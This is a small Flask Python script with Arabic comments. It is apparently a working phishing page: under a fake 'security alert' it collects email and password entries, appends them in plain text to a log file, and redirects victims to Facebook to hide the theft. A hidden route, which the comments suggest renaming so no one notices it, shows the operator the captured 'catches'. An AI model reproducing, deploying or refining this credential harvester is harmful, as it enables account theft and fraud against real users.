from flask import Flask, request, redirect, render_template_string
import os

app = Flask(__name__)

# كود الـ HTML (خليه كيما راه)
HTML_PAGE = """
<div style="text-align:center; padding:50px;">
    <h2>تنبيه أمني!</h2>
    <form action="/login" method="POST">
        <input type="text" name="u_name" placeholder="Email"><br><br>
        <input type="password" name="u_pass" placeholder="Password"><br><br>
        <button type="submit">تأكيد الهوية</button>
    </form>
</div>
"""

@app.route('/')
def home():
    return render_template_string(HTML_PAGE)

# --- هادا هو السطر الجديد والسري ---
@app.route('/fares_secret_logs') # تقدر تبدل هاد الاسم باش حتى واحد ما يفيق بيه
def show_logs():
    if os.path.exists("log.txt"):
        with open("log.txt", "r") as f:
            data = f.read()
        return f"<pre>{data}</pre>" # يخرجلك الصيدات مرتبين
    return "لا توجد صيدات بعد!"
# ---------------------------------

@app.route('/login', methods=['POST'])
def login():
    user = request.form.get('u_name')
    password = request.form.get('u_pass')
    if user and password:
        with open("log.txt", "a") as f:
            f.write(f"User: {user} | Pass: {password}\\n")
    return redirect("https://www.facebook.com")

if __name__ == "__main__":
    app.run()
